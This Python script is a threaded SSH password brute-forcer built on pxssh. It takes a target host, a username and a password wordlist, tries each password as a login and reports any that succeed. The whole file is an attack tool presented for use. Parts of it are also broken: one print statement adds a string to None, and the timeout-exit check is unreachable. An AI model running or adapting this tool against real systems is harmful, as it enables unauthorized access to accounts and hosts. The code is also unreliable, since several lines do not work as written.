# -- coding: utf-8 --
from pexpect import pxssh
import optparse
import time
from threading import *
maxConnections=5
connection_lock=BoundedSemaphore(value=maxConnections)
Found=False
Fails=0
def connect(host,user,password,release):
	global Found
	global Fails
	try:
		s=pxssh.pxssh()
		s.login(host,user,password)
		print('[+]Password Found:'+password)
		Found=True
	except Exception as e:
		if 'read_nonblocking' in str(e):
			Fails+=1
			time.sleep(5)
			connect(host,user,password,False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host,user,password,False)
	finally:
		if release:
			connection_lock.release()
def main():
	parser=optparse.OptionParser('usage %prog -H <target host> -u <user> -F <password list>')
	parser.add_option('-H',dest='tgtHost',type='string',help='specify the target host')
	parser.add_option('-u',dest='user',type='string',help='specify the user')
	parser.add_option('-F',dest='passwords',type='string',help='specify the password file')
	(options, args)=parser.parse_args()
	host=options.tgtHost
	user=options.user
	passwords=options.passwords
	if host==None or user==None or passwords==None:
		print(parser.usage)
		print('没有输入任何参数')
		exit(0)
	fn=open(passwords,'r')
	for line in fn.readlines():
		if Found:
			print('[*]Exiting: Password Found')
			exit(0)
			if Fails>5:
				print('[!]Exiting:Too many Socket Timeouts')
				exit(0)
		connection_lock.acquire()
		psw=line.strip('\r').strip('\n')
		print("[-] Testing :") +str(psw)
		t=Thread(target=connect, args=(host,user,psw,True))
		t.start()
if __name__=='__main__':
	main()
